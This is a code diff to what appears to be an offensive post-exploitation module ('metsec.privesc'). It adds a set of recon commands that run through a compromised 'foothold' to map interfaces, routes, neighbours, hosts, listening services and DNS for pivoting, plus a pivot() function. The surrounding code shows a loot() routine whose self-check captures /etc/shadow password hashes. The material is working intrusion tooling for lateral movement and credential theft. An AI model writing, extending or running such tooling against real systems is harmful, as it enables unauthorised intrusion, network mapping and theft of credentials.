@@ -48,9 +48,25 @@ LOOT = {
 }
 
 
+# Internal-network recon run through the foothold — the lay of the land for pivoting.
+PIVOT = {
+    "interfaces": "ip -o addr 2>/dev/null || ifconfig 2>/dev/null",
+    "routes": "ip route 2>/dev/null || route -n 2>/dev/null",
+    "neighbors": "ip neigh 2>/dev/null || arp -an 2>/dev/null",
+    "hosts": "cat /etc/hosts 2>/dev/null",
+    "listening": "ss -tunlp 2>/dev/null || netstat -tunlp 2>/dev/null",
+    "dns": "cat /etc/resolv.conf 2>/dev/null",
+}
+
+
 def enumerate_host(run) -> dict:
     """run: a callable(command)->output (the exec channel). Returns a host profile."""
     return {k: run(cmd) for k, cmd in ENUM.items()}
+
+
+def pivot(run) -> dict:
+    """Internal network map from the foothold (interfaces, routes, neighbors, services)."""
+    return {k: run(cmd) for k, cmd in PIVOT.items()}
 
 
 def loot(run) -> dict:
@@ -145,4 +161,7 @@ if __name__ == "__main__":  # offline self-check: python -m metsec.privesc
 
     captured = loot(lambda c: "root:$6$hash:::" if "shadow" in c else "")
     assert list(captured) == ["shadow"] and captured["shadow"].startswith("root:"), captured
+
+    pv = pivot(lambda c: "2: eth0 inet 10.0.0.5/24" if "addr" in c else "")
+    assert "interfaces" in pv and "eth0" in pv["interfaces"]
     print("privesc self-check ok")
